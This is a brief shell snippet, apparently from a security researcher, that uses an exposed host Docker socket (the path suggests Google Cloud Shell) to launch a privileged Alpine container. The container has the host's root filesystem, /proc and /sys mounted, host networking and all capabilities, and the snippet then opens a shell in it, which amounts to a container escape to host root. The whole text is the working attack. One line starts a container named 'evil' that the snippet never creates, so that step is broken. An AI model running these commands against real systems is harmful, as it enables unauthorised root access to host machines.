# create a privileged container with host root filesystem mounted - wtm@offensi.com
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start evil
sudo docker -H unix:///google/host/var/run/docker.sock exec -it LiveOverflow-container /bin/sh
